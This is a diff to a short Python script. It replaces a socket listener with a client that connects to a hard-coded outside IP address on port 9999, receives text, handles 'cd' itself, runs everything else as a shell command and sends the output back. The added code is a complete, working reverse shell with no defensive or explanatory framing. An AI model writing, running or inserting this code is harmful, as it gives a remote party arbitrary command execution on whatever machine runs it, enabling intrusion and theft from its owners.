@@ -1,49 +1,23 @@
 import socket
-import sys
+import os
+import subprocess
 
-#0-2^16-1 port range
-def create_socket():
-    
-    try:        
-        global host
-        global port
-        global skt
+skt = socket.socket()
+host = '138.68.68.65'
+port = 9999
+
+skt.connect((host, port))
+
+while True:
+    data = skt.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
         
-        host = ""
-        port = 8080
-        
-        skt=socket.socket()
-    
-    except socket.error as msg:
-        
-        print("Socket creation error: ",str(msg))
-        
-def socket_bind_and_listen():
-    
-    try:
-        global host
-        global port
-        global skt 
-        
-        skt.bind((host,port))
-        skt.listen()
-        
-    except socket.error as msg:
-        print("Socket binding error: ", str(msg))
-        socket_bind_and_listen()
-         
-def socket_accept_connection():
-    connection,address = skt.accept()
-    
-    print("Client IP   :  ",address[0])
-    print("Client Port:  ",address[1])
-    
-    sending_commands()
-    
-    connection.close()
-     
-    
-def main():
-    create_socket()
-    
-main()
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,
+        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        skt.send(str.encode(output_str + currentWD))
+        print(output_str)
